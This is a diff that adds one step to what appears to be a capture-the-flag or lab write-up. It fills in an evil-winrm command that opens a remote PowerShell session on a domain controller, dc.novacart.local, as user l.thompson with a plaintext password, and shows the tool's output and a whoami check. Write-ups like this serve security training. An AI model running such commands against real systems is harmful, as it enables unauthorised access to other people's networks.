@@ -795,5 +795,18 @@ The account should now be enabled so ill log in via WINRM
 ## Access over WINRM
 
 ```python
-
+evil-winrm -i dc.novacart.local -u l.thompson -p 'Password123!'                                           
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\l.thompson\Documents> whoami
+novacart\l.thompson
+*Evil-WinRM* PS C:\Users\l.thompson\Documents>
 ```
+Now im logged in as this user!
+
